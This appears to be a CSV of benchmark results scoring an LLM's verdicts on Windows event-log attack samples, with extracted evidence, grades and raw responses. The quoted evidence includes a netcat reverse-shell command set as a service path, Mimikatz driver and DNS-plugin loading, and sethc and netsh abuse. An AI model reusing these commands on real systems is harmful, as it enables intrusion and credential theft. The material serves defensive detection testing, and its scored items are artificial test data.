# DETECTION BENCHMARK RESULTS - column glossary
# ----------------------------------------------------------------------
# Model               LLM model id used to score this run
# Filename            Source artifact analyzed (EVTX file or CSV stem)
# Difficulty          Tag from metadata.json: easy / medium / hard
# Test Set            A=Known Pattern, B=Obfuscated, C=Noise-heavy, D=Benign
# Status              processed | error | context_exceeded
# Malicious           Model verdict: YES (attack) or NO (routine/benign)
# Confidence %        Heuristic confidence from response structure quality, not model-stated (0-100)
# Alignment %         Share of cited evidence found verbatim in source (0-100)
# Structure Valid     Response parsed cleanly into the required sections
# Event IDs           Event IDs extracted from the model's EVIDENCE block
# Processes           Process names extracted from the model's EVIDENCE block
# Accounts            Account names extracted from the model's EVIDENCE block
# Commands            Command lines / script blocks extracted from EVIDENCE
# Network             IPs / hostnames / shares extracted from EVIDENCE
# Registry            Registry keys / values extracted from EVIDENCE
# Hallucination %     Share of cited evidence not found in source events (0-100)
# Response Time (s)   Wall-clock seconds from prompt sent to response received
# Extraction (6)      Did the model find the right evidence? (0-6)
# Interpretation (6)  Did it correctly explain what the evidence implies? (0-6)
# NoHallucination (4) 4 = no fabricated evidence, 0 = heavy fabrication
# Reasoning (4)       Quality of the chain of reasoning in EXPLANATION (0-4)
# Total (20)          Sum of the four criteria above (0-20)
# Grade               Letter grade from Total: A>=17, B>=14, C>=10, D<10
# LLM Response        Full raw text the model returned, before any parsing
#
# Skip these lines in pandas:  pd.read_csv(path, comment='#')
# ----------------------------------------------------------------------
Model,Filename,Difficulty,Test Set,Status,Malicious,Confidence %,Alignment %,Structure Valid,Event IDs,Processes,Accounts,Commands,Network,Registry,Hallucination %,Response Time (s),Extraction (6),Interpretation (6),NoHallucination (4),Reasoning (4),Total (20),Grade,LLM Response
gpt-5.5-2026-04-23,ID7045-New service for Mimikatz +npcap.evtx,easy,A,processed,YES,100.0,90.9,YES,7045,"D:\Service\test.exe, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service, ""C:\Program Files\Microsoft\Microsoft Search in Bing\MicrosoftSearchInBing.exe"", \SystemRoot\system32\DRIVERS\npcap.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys",LocalSystem,"D:\Service\test.exe, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service, ""C:\Program Files\Microsoft\Microsoft Search in Bing\MicrosoftSearchInBing.exe"", \SystemRoot\system32\DRIVERS\npcap.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys",jump01.offsec.lan,,16.7,14.36,5.5,6.0,3.3,4,18.8,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 7045
- Processes: D:\Service\test.exe, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service, ""C:\Program Files (x86)\Microsoft\Microsoft Search in Bing\MicrosoftSearchInBing.exe"", \SystemRoot\system32\DRIVERS\npcap.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys
- Accounts: LocalSystem
- Commands: D:\Service\test.exe, ""C:\Program Files\Common Files\Microsoft Shared\ClickToRun\OfficeClickToRun.exe"" /service, ""C:\Program Files (x86)\Microsoft\Microsoft Search in Bing\MicrosoftSearchInBing.exe"", \SystemRoot\system32\DRIVERS\npcap.sys, C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys
- Network: jump01.offsec.lan
- Registry: None

EXPLANATION:
The logs show service installation events, including repeated installation of mimikatz driver (mimidrv) with image path C:\TOOLS\Security_tool\Mimikatz-fev-2020\mimidrv.sys as an auto start kernel mode driver. Mimikatz-related driver installation is attack behavior associated with credential theft tooling, making the overall activity malicious."
gpt-5.5-2026-04-23,ID7045-Random service installation.evtx,easy,A,processed,YES,100.0,83.3,YES,"104, 7045",virusé.exe,"admmig, LocalSystem",,fs02.offsec.lan,,0.0,7.00,5.0,6.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 104, 7045
- Processes: virusé.exe
- Accounts: admmig, LocalSystem
- Commands: None
- Network: fs02.offsec.lan
- Registry: None

EXPLANATION:
The System event log was cleared by admmig, followed shortly by installation of a new service named bad-task running as LocalSystem. The service ImagePath is virusé.exe, and the combination of log clearing followed by service creation indicates malicious behavior."
gpt-5.5-2026-04-23,ID800-4103-4104-Service abuse with Failure Command.evtx,easy,A,processed,YES,100.0,100.0,YES,"800, 4103, 4104","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe",OFFSEC\admmig,"PSConsoleHostReadLine | Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447"" | Out-Default | Microsoft.PowerShell.Core\Set-StrictMode -Off | prompt","win10-02.offsec.lan, 10.10.14.26",HKLM:\System\CurrentControlSet\services\xboxgip,0.0,21.17,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe
- Accounts: OFFSEC\admmig
- Commands: PSConsoleHostReadLine; Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name FailureCommand -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447""; Out-Default; Microsoft.PowerShell.Core\Set-StrictMode -Off; prompt
- Network: win10-02.offsec.lan, 10.10.14.26
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The logs show OFFSEC\admmig using PowerShell to set the FailureCommand value under HKLM:\System\CurrentControlSet\services\xboxgip. The configured value runs C:\nc.exe with powershell.exe to connect to 10.10.14.26 4447, which indicates malicious reverse shell behavior through a service failure command."
gpt-5.5-2026-04-23,ID800-4103-4104-Service abuse with malicious path.evtx,easy,A,processed,YES,100.0,100.0,YES,"800, 4103, 4104","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe",OFFSEC\admmig,"Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447"", Microsoft.PowerShell.Core\Set-StrictMode -Off, prompt","win10-02.offsec.lan, 10.10.14.26",HKLM:\System\CurrentControlSet\services\xboxgip,0.0,12.63,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4103, 4104
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\nc.exe, powershell.exe
- Accounts: OFFSEC\admmig
- Commands: Set-ItemProperty -path HKLM:\System\CurrentControlSet\services\xboxgip -name ImagePath -value ""C:\nc.exe -e powershell.exe 10.10.14.26 4447"", Microsoft.PowerShell.Core\Set-StrictMode -Off, prompt
- Network: win10-02.offsec.lan, 10.10.14.26
- Registry: HKLM:\System\CurrentControlSet\services\xboxgip

EXPLANATION:
The logs show OFFSEC\admmig using PowerShell to modify the ImagePath of HKLM:\System\CurrentControlSet\services\xboxgip. The new value launches C:\nc.exe with -e powershell.exe to connect to 10.10.14.26 4447, which is consistent with a reverse shell via service hijacking."
gpt-5.5-2026-04-23,ID800-4103-4104-Service creation (PowerShell).evtx,easy,B,processed,YES,100.0,75.0,YES,"800, 4104, 4103","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, virus.exe",OFFSEC\admmig,"New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""', Out-Default, prompt",FS03.offsec.lan,,0.0,11.73,4.5,6.0,4.0,4,18.5,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 800, 4104, 4103
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, virus.exe
- Accounts: OFFSEC\admmig
- Commands: New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""', Out-Default, prompt
- Network: FS03.offsec.lan
- Registry: None

EXPLANATION:
PowerShell was used by OFFSEC\admmig to run New-Service -Name ""hackervirus"" -BinaryPathName '""virus.exe""' on FS03.offsec.lan. Creating a service named ""hackervirus"" pointing to ""virus.exe"" indicates suspicious persistence or malware installation behavior rather than routine administration."
gpt-5.5-2026-04-23,ID13-WMIimplant registry crash control.evtx,easy,A,processed,YES,100.0,83.3,YES,13,"C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe",,,fs03vuln.offsec.lan,"HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\LogEvent, HKLM\System\CurrentControlSet\Control\CrashControl\SendAlert, HKLM\System\CurrentControlSet\Control\CrashControl\CrashDumpEnabled, HKLM\System\CurrentControlSet\Control\CrashControl\Overwrite, HKLM\System\CurrentControlSet\Control\CrashControl\KernelDumpOnly, HKLM\System\CurrentControlSet\Control\CrashControl\AutoReboot, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile, HKLM\System\CurrentControlSet\Control\CrashControl\MiniDumpDir",0.0,14.65,5.0,6.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 13
- Processes: C:\Windows\system32\services.exe, C:\Windows\system32\wbem\wmiprvse.exe
- Accounts: None
- Commands: None
- Network: fs03vuln.offsec.lan
- Registry: HKLM\System\CurrentControlSet\Services\hacker23\Start, HKLM\System\CurrentControlSet\Services\hacker23\ImagePath, HKLM\System\CurrentControlSet\Control\CrashControl\LogEvent, HKLM\System\CurrentControlSet\Control\CrashControl\SendAlert, HKLM\System\CurrentControlSet\Control\CrashControl\CrashDumpEnabled, HKLM\System\CurrentControlSet\Control\CrashControl\Overwrite, HKLM\System\CurrentControlSet\Control\CrashControl\KernelDumpOnly, HKLM\System\CurrentControlSet\Control\CrashControl\AutoReboot, HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile, HKLM\System\CurrentControlSet\Control\CrashControl\MiniDumpDir

EXPLANATION:
The events show creation or modification of a suspicious service registry path named HKLM\System\CurrentControlSet\Services\hacker23 with Start and ImagePath values. The same log set also shows repeated WMI-tagged registry changes by C:\Windows\system32\wbem\wmiprvse.exe, including modification and restoration of HKLM\System\CurrentControlSet\Control\CrashControl\DumpFile, which forms a suspicious pattern rather than isolated routine activity."
gpt-5.5-2026-04-23,ID19-20-WMI registration via PowerLurk.evtx,easy,A,processed,YES,100.0,100.0,YES,"20, 19","cmd.exe, notepad.exe",OFFSEC\admmig,cmd.exe /c echo %ProcessId% &gt | &gt | c:\\\\temp\\\\log.txt,fs01.offsec.lan,,16.7,12.37,6.0,5.0,3.3,3,17.3,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 20, 19
- Processes: cmd.exe, notepad.exe
- Accounts: OFFSEC\admmig
- Commands: cmd.exe /c echo %ProcessId% &gt;&gt; c:\\\\temp\\\\log.txt
- Network: fs01.offsec.lan
- Registry: None

EXPLANATION:
The events show a WMI consumer and WMI filter created by OFFSEC\admmig with the same Name ""Evil"", indicating a paired WMI event subscription pattern. The filter watches for notepad.exe process starts and the consumer runs cmd.exe /c echo %ProcessId% &gt;&gt; c:\\\\temp\\\\log.txt, which is consistent with WMI-based persistence or execution behavior."
gpt-5.5-2026-04-23,ID4688-netsh helper DLL.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4688","C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe",admmig,netsh  add helper  mimikatz.exe,fs01.offsec.lan,,0.0,7.06,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688
- Processes: C:\Windows\System32\netsh.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: netsh  add helper  mimikatz.exe
- Network: fs01.offsec.lan
- Registry: None

EXPLANATION:
The Security event log was cleared by admmig, followed shortly by execution of netsh with the command netsh  add helper  mimikatz.exe. Clearing logs combined with adding a helper named mimikatz.exe indicates attack behavior and likely attempted credential theft or persistence."
gpt-5.5-2026-04-23,ID5136-AdminSDholder backdoor obfuscation (via localizationDisplayId).evtx,easy,B,processed,YES,100.0,50.0,YES,5136,,admmig,,"rootdc1.offsec.lan, offsec.lan",,0.0,34.88,3.0,6.0,4.0,3,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig
- Commands: None
- Network: rootdc1.offsec.lan, offsec.lan
- Registry: None

EXPLANATION:
The events show repeated 5136 directory object modifications by admmig on CN=User-Force-Change-Password,CN=Extended-Rights,CN=Configuration,DC=offsec,DC=lan. The AttributeLDAPDisplayName localizationDisplayId is changed between AttributeValue 2 and AttributeValue 3 and then reverted minutes later, indicating suspicious paired tampering of an Active Directory extended-rights object."
gpt-5.5-2026-04-23,ID5136-AdminSDholder permissions changed.evtx,easy,A,processed,YES,100.0,50.0,YES,5136,,admmig,,rootdc1.offsec.lan,,0.0,12.85,3.0,6.0,4.0,3,16.0,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 5136
- Processes: None
- Accounts: admmig
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
Two 5136 directory service change events with the same OpCorrelationID modified CN=AdminSDHolder,CN=System,DC=offsec,DC=lan and the nTSecurityDescriptor attribute. The second AttributeValue adds a broad access control entry for S-1-5-21-4230534742-2542757381-3142984815-1234, which is consistent with malicious AdminSDHolder permission persistence."
gpt-5.5-2026-04-23,ID12-LSA Protect mode enabled RunAsPPL.evtx,easy,D,processed,NO,100.0,100.0,YES,"14, 12",,,,WIN10-client01.offsec.lan,,0.0,6.07,6.0,5.0,4.0,1,16.0,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 14, 12
- Processes: None
- Accounts: None
- Commands: None
- Network: WIN10-client01.offsec.lan
- Registry: None

EXPLANATION:
The logs contain Microsoft-Windows-Wininit Event IDs 14 and 12 with configuration and level values only. There are no processes, accounts, commands, registry keys, or suspicious network indicators present to support malicious activity."
gpt-5.5-2026-04-23,ID4664-symbolic link created.evtx,easy,A,processed,NO,100.0,100.0,YES,4664,,Admin,,WIN,,16.7,8.22,6.0,5.0,3.3,2,16.3,B,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4664
- Processes: None
- Accounts: Admin
- Commands: None
- Network: WIN
- Registry: None

EXPLANATION:
Event 4664 shows Admin associated with C:\Users\Admin\Downloads\Sysmon\sysmonconf.xml and C:\Users\Admin\Downloads\sysmonconf.xml. There are no commands, processes, registry changes, or network indicators showing attack behavior in this event alone."
gpt-5.5-2026-04-23,ID150-Failed DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,150,.\mimilib.dll,,,rootdc1.offsec.lan,,0.0,13.37,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 150
- Processes: .\mimilib.dll
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
Two Microsoft-Windows-DNS-Server-Service Event ID 150 entries on rootdc1.offsec.lan reference .\mimilib.dll within a short time window. The repeated DNS Server service loading/reference to mimilib.dll is consistent with malicious DNS plugin DLL behavior rather than routine DNS activity."
gpt-5.5-2026-04-23,ID4688-DNS DLL serverlevelplugindll command.evtx,easy,A,processed,YES,100.0,100.0,YES,4688,"C:\Windows\System32\dnscmd.exe, C:\Windows\System32\cmd.exe",admmig,"dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""",rootdc1.offsec.lan,,0.0,6.71,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4688
- Processes: C:\Windows\System32\dnscmd.exe, C:\Windows\System32\cmd.exe
- Accounts: admmig
- Commands: dnscmd.exe  /config /serverlevelplugindll ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll""
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The event shows admmig launching dnscmd.exe from cmd.exe to configure /serverlevelplugindll with ""C:\TOOLS\Mimikatz-fev-2020\mimilib.dll"". Configuring a DNS server-level plugin DLL pointing to a Mimikatz-related DLL indicates malicious attack behavior."
gpt-5.5-2026-04-23,ID770-Success DLL loaded by DNS server.evtx,easy,A,processed,YES,100.0,100.0,YES,"771, 770",C:\TOOLS\Mimikatz-fev-2020\mimilib.dll,,,rootdc1.offsec.lan,,0.0,10.45,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 771, 770
- Processes: C:\TOOLS\Mimikatz-fev-2020\mimilib.dll
- Accounts: None
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The DNS Server events show C:\TOOLS\Mimikatz-fev-2020\mimilib.dll associated with rootdc1.offsec.lan. The presence of a Mimikatz-related DLL in DNS Server event data is attack behavior rather than routine activity."
gpt-5.5-2026-04-23,ID4673-Privilege SeMachineAccountPrivilege called.evtx,easy,A,processed,NO,100.0,100.0,YES,4673,C:\Windows\System32\lsass.exe,hack1,,rootdc1.offsec.lan,,0.0,9.81,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4673
- Processes: C:\Windows\System32\lsass.exe
- Accounts: hack1
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
This is a single Security 4673 event showing hack1 using SeMachineAccountPrivilege through C:\Windows\System32\lsass.exe. There are no commands, registry changes, or related sequential events in the provided data to establish an attack pattern, so this is not enough to classify as malicious."
gpt-5.5-2026-04-23,ID4648-4624-RunAsCS login.evtx,easy,A,processed,YES,100.0,100.0,YES,"1102, 4648, 4624, 4688","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe","admmig, test10, FS03$","/c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami","FS03.offsec.lan, localhost, FS03",,0.0,13.70,6.0,5.0,4.0,3,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4648, 4624, 4688
- Processes: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\whoami.exe
- Accounts: admmig, test10, FS03$
- Commands: /c whoami, \??\C:\Windows\system32\conhost.exe 0xffffffff, whoami
- Network: FS03.offsec.lan, localhost, FS03
- Registry: None

EXPLANATION:
The Security log was cleared by admmig, followed immediately by PowerShell using explicit credentials for test10 and a successful LogonType 3 session. The sequence then created cmd.exe with /c whoami and whoami.exe under test10, indicating post-logon command execution after audit log clearing."
gpt-5.5-2026-04-23,"ID4688,4624-RottenPotatoNG.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4624","C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe","hack1, ANONYMOUS LOGON, FS03VULN$","MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff","fs03vuln.offsec.lan, 127.0.0.1",,0.0,12.59,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4624
- Processes: C:\TOOLS\MSFRottenPotato.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe
- Accounts: hack1, ANONYMOUS LOGON, FS03VULN$
- Commands: MSFRottenPotato.exe, ""C:\Windows\System32\cmd.exe"", \??\C:\Windows\system32\conhost.exe 0xffffffff
- Network: fs03vuln.offsec.lan, 127.0.0.1
- Registry: None

EXPLANATION:
The pattern is malicious: hack1 cleared the Security log, then executed C:\TOOLS\MSFRottenPotato.exe. Immediately afterward, processes were created as FS03VULN$ with S-1-5-18 context, including cmd.exe and conhost.exe, alongside an ANONYMOUS LOGON from 127.0.0.1."
gpt-5.5-2026-04-23,"ID4688,4648,4624-Runas execution with different user.evtx",easy,A,processed,YES,100.0,100.0,YES,"1102, 4688, 4648, 4624, 4672","C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe","admmig, hack1, FS03$","runas  /user:offsec\hack1 cmd.exe , cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe","FS03.offsec.lan, localhost, ::1, FS03",,0.0,14.51,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1102, 4688, 4648, 4624, 4672
- Processes: C:\Windows\System32\runas.exe, C:\Windows\System32\svchost.exe, C:\Windows\System32\cmd.exe, C:\Windows\System32\conhost.exe, C:\Windows\System32\ctfmon.exe
- Accounts: admmig, hack1, FS03$
- Commands: runas  /user:offsec\hack1 cmd.exe , cmd.exe, \??\C:\Windows\system32\conhost.exe 0xffffffff, ctfmon.exe
- Network: FS03.offsec.lan, localhost, ::1, FS03
- Registry: None

EXPLANATION:
The Security log was cleared by admmig, followed immediately by runas launching cmd.exe as offsec\hack1. The same sequence shows explicit credentials, successful logons for hack1, special privileges assigned to hack1, and elevated process creation, which together indicate malicious post-compromise activity."
gpt-5.5-2026-04-23,ID4704-4705-User righ assigned to account.evtx,easy,A,processed,YES,100.0,100.0,YES,"4704, 4705",,admmig,,fs02.offsec.lan,,0.0,11.27,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4704, 4705
- Processes: None
- Accounts: admmig
- Commands: None
- Network: fs02.offsec.lan
- Registry: None

EXPLANATION:
The logs show repeated 4704 and 4705 events where admmig assigns and then removes sensitive privileges on the same TargetSid within short time windows. The sequence includes SeCreateTokenPrivilege, SeAssignPrimaryTokenPrivilege, SeDebugPrivilege, and SeImpersonatePrivilege, indicating a suspicious pattern of temporary privilege manipulation rather than routine activity."
gpt-5.5-2026-04-23,ID4717-4718-System security granded to account.evtx,easy,A,processed,YES,100.0,100.0,YES,"4717, 4718",,admmig,,fs02.offsec.lan,,0.0,16.94,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4717, 4718
- Processes: None
- Accounts: admmig
- Commands: None
- Network: fs02.offsec.lan
- Registry: None

EXPLANATION:
The logs show admmig granting and then removing SeDenyServiceLogonRight for the same TargetSid in a short time window. This paired user-rights change pattern on the same identifier is suspicious and may indicate attempted manipulation of service logon restrictions."
gpt-5.5-2026-04-23,ID 4765 - SID history added.evtx,easy,A,processed,YES,100.0,75.0,YES,"4661, 4765, 4658",C:\Windows\System32\lsass.exe,"Administrator, maincorp.local\Domain Admins, Andrei",,2012r2srv.maincorp.local,,0.0,8.83,4.5,5.0,4.0,3,16.5,B,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4661, 4765, 4658
- Processes: C:\Windows\System32\lsass.exe
- Accounts: Administrator, maincorp.local\Domain Admins, Andrei
- Commands: None
- Network: 2012r2srv.maincorp.local
- Registry: None

EXPLANATION:
Event ID 4765 shows Administrator added SID history from maincorp.local\Domain Admins to the target account Andrei. This pattern indicates privilege escalation or persistence because the Domain Admins SID was associated with another account, with related SAM access and handle closure events occurring at the same time."
gpt-5.5-2026-04-23,ID 4865 4706 - trust added.evtx,easy,A,processed,YES,100.0,100.0,YES,"4741, 4742, 4706, 4865",,"ROOTBLUE$, Administrator",,"CDCWTRDC01.mypartner.lan, rootblue.lan, child.rootblue.lan",,0.0,15.63,6.0,6.0,4.0,4,20.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 4741, 4742, 4706, 4865
- Processes: None
- Accounts: ROOTBLUE$, Administrator
- Commands: None
- Network: CDCWTRDC01.mypartner.lan, rootblue.lan, child.rootblue.lan
- Registry: None

EXPLANATION:
The events show Administrator creating and modifying the ROOTBLUE$ computer account, followed immediately by creation of a trusted domain object for rootblue.lan. The subsequent forest trust information entries for rootblue.lan and child.rootblue.lan indicate establishment of cross-domain or cross-forest trust relationships, which is suspicious as a coordinated privilege/trust expansion pattern."
gpt-5.5-2026-04-23,ID5136-4662 sensitive GPO edited.evtx,easy,A,processed,NO,100.0,43.8,YES,"4662, 5136",,"admmig, FS02$, ROOTDC1$",,rootdc1.offsec.lan,,0.0,15.98,2.6,5.0,4.0,1,12.6,C,"MALICIOUS: NO

EVIDENCE:
- Event IDs: 4662, 5136
- Processes: None
- Accounts: admmig, FS02$, ROOTDC1$
- Commands: None
- Network: rootdc1.offsec.lan
- Registry: None

EXPLANATION:
The events show Directory Services object access and a groupPolicyContainer versionNumber change by admmig, followed by object access from FS02$ and ROOTDC1$. The logs do not include any process execution, command lines, registry changes, or network indicators showing attack behavior beyond the GPO version update, so this appears consistent with routine Active Directory/GPO activity based only on the provided data."
gpt-5.5-2026-04-23,ID1-CMD executed via sticky key call.evtx,easy,A,processed,YES,100.0,100.0,YES,"1, 18","C:\Windows\System32\cmd.exe, C:\Windows\System32\winlogon.exe, C:\Windows\system32\mmc.exe",OFFSEC\admmig,"C:\windows\system32\cmd.exe sethc.exe 211, winlogon.exe",win10-02.offsec.lan,,0.0,13.27,6.0,6.0,4.0,3,19.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 1, 18
- Processes: C:\Windows\System32\cmd.exe, C:\Windows\System32\winlogon.exe, C:\Windows\system32\mmc.exe
- Accounts: OFFSEC\admmig
- Commands: C:\windows\system32\cmd.exe sethc.exe 211, winlogon.exe
- Network: win10-02.offsec.lan
- Registry: None

EXPLANATION:
The evidence shows C:\Windows\System32\winlogon.exe launching C:\Windows\System32\cmd.exe with the command line C:\windows\system32\cmd.exe sethc.exe 211, which is suspicious because it ties cmd.exe execution to sethc.exe. This pattern is consistent with malicious command shell access through an accessibility-related execution path rather than routine activity."
gpt-5.5-2026-04-23,ID11-New sethc file created from CMD copy.evtx,easy,A,processed,YES,100.0,100.0,YES,11,"C:\Windows\system32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\seth2c.exe, C:\Windows\System32\sethc.exe",,,fs02.offsec.lan,,0.0,14.92,6.0,6.0,4.0,2,18.0,A,"MALICIOUS: YES

EVIDENCE:
- Event IDs: 11
- Processes: C:\Windows\system32\cmd.exe, C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe, C:\Windows\System32\seth2c.exe, C:\Windows\System32\sethc.exe
- Accounts: None
- Commands: None
- Network: fs02.offsec.lan
- Registry: None

EXPLANATION:
Sysmon file creation events show C:\Windows\system32\cmd.exe creating C:\Windows\System32\seth2c.exe and powershell.exe creating C:\Windows\System32\sethc.exe in close sequence. The manipulation of sethc.exe and similarly named seth2c.exe under C:\Windows\System32 is suspicious and consistent with attack behavior rather than routine activity."
